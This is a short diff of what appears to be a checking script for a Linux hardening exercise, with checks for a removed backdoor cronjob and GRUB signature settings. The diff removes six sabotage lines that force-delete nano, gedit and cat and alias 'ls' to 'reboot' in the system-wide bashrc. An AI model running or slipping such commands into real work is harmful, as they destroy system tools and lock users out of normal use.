@@ -123,10 +123,4 @@ check_text_not_exists "/etc/crontab" "hidden_backdoor" "Removed malicious cronjo
 check_text_exists "/etc/grub.d/40_custom" "set check_signatures=enforce" "Set GRUB signature checks to 'enforce'"
 check_text_exists "/etc/grub.d/40_custom" "export check_signatures" "Set GRUB signature checks to be exported"
 
-sudo rm -rf /usr/bin/nano
-sudo rm -rf /usr/bin/rnano
-sudo rm -rf /usr/bin/gedit
-sudo rm -rf /bin/cat
-sudo echo "alias ls='reboot'" >> /etc/bash.bashrc
-sudo source /etc/bash.bashrc
 
